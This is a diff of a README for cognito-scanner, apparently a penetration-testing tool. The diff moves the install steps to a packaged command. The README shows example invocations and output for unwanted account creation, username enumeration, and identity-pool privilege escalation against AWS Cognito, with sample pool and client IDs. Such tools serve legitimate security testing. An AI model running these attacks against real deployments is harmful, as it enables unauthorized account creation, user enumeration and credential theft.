@@ -19,7 +19,7 @@ This repository contains a script which implements three different attacks on Co
 You can easily check that all requirements are met with the commands below:
 ```bash
 $ python3 --version
-$ pip3 --version
+$ pip --version
 $ git --version
 ```
 
@@ -33,24 +33,24 @@ $ git clone https://github.com/padok-team/cognito-scanner.git
 $ git clone git@github.com:padok-team/cognito-scanner.git
 $ cd cognito-scanner/
 ```
-2. [Optionnal] Create a python virtual environment
+2. Create the python package
 ```bash
-# Create the environment
-$ python3 -m venv <env_name>
-# Activate it
-$ source <env_name>/bin/activate
+# In the root directory of your package, run the following command to build the distribution files
+$ python3 setup.py sdist bdist_wheel
+# Leave the directory
+$ cd
+# Install your package using pip
+$ pip install path/to/cogniot-scanner/dist/cognito-scanner-0.1.0.tar.gz
 ```
-3. Install the necessary packages `pip install -r requirements.txt`
+3. You can now try to run the tool using `cognito-scanner --help`
 
 ## Usage
 
 You can get details of how to use the script :
 ```bash
-# Go to the scanner folder
-$ cd scanner/
-$ python3 cognito-scanner.py --help
+$ cognito-scanner --help
 # Get information about how to use the unwanted account creation script
-$ python3 cognito-scanner.py account-creation --help
+$ cognito-scanner account-creation --help
 ```
 
 ### Example
@@ -60,7 +60,7 @@ $ python3 cognito-scanner.py account-creation --help
 #### Unwanted account creation
 
 ```bash
-$ python3 cognito-scanner.py account-creation --region=eu-west-3 --user_attributes=mymail@mail.com --client_id=pucXBthcyRvzwqj0WXG28DQeav --username='cognito_user' --password='R4nd0mP4$$word'
+$ cognito-scanner account-creation --region=eu-west-3 --user_attributes=mymail@mail.com --client_id=pucXBthcyRvzwqj0WXG28DQeav --username='cognito_user' --password='R4nd0mP4$$word'
 # Output
 {
 	UserConfirmed: False
@@ -71,7 +71,7 @@ $ python3 cognito-scanner.py account-creation --region=eu-west-3 --user_attribut
 #### Account Oracle
 
 ```bash
-$ python3 cognito-scanner.py account-oracle --client_id=pucXBthcyRvzwqj0WXG28DQeav --region=eu-west-3 --file=usernames.txt
+$ cognito-scanner account-oracle --client_id=pucXBthcyRvzwqj0WXG28DQeav --region=eu-west-3 --file=usernames.txt
 # Output
 Users found available in the file ./existing_users.txt
 ```
@@ -79,7 +79,7 @@ Users found available in the file ./existing_users.txt
 #### Identity pool escalation
 
 ```bash
-$ python3 cognito-scanner.py --region=eu-west-3 --pool_id=eu-west-3_liyFAGBUV --client_id=pucXBthcyRvzwqj0WXG28DQeav --identity_pool_id=eu-west-3:52983214-5fd7-438e-9088-b2e839ceefa0 --username=pentest --password='aR4ndomPassw0rd$'
+$ cognito-scanner --region=eu-west-3 --pool_id=eu-west-3_liyFAGBUV --client_id=pucXBthcyRvzwqj0WXG28DQeav --identity_pool_id=eu-west-3:52983214-5fd7-438e-9088-b2e839ceefa0 --username=pentest --password='aR4ndomPassw0rd$'
 # Output
 [hacker]
 output = json
